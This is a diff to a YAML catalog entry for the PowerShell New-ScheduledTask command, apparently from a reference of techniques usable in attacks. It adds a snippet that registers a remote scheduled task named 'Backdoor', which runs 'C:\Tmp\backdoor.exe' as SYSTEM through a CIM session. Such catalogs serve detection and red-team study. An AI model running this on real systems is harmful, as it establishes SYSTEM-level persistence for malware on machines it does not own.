@@ -1,13 +1,17 @@
 ---
 Name: New-ScheduledTask
 Description: Creates a scheduled task instance
-Updated: 2023-07-01
+Updated: 2024-12-13
 Toolsets:
   - Builtin
   - CIMSession
-  - TODO
 Commands:
-  - Command: New-ScheduledTask -CimSession $s
+  - Command: |
+      $a = New-ScheduledTaskAction -Execute "C:\Tmp\backdoor.exe" -Argument '-background'
+      $p = New-ScheduledTaskPrincipal -UserId "NT Authority\SYSTEM"
+      $ss = New-ScheduledTaskSettingsSet -MultipleInstances Parallel -AllowStartIfOnBatteries -Compatibility Win8
+      $d = New-ScheduledTask -CimSession $s -Action $a -Principal $p -Settings $ss
+      $t = Register-ScheduledTask -CimSession $s Backdoor -InputObject $d
     Description: Create new scheduled task
     Usecases:
     Function: Execute
